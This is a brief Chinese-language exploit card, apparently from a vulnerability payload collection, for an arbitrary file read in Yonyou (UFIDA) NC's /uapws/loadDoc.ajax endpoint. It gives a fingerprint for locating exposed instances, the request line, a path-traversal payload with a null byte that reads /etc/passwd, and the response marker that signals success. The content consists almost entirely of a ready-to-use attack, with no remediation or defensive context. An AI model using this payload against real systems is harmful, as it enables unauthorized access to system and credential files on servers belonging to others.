# 用友NCloadDoc.ajax存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /uapws/loadDoc.ajax HTTP/1.1`

**Payload**
```
ws=../../../../../../../../etc/passwd%00
```
- **响应特征**：200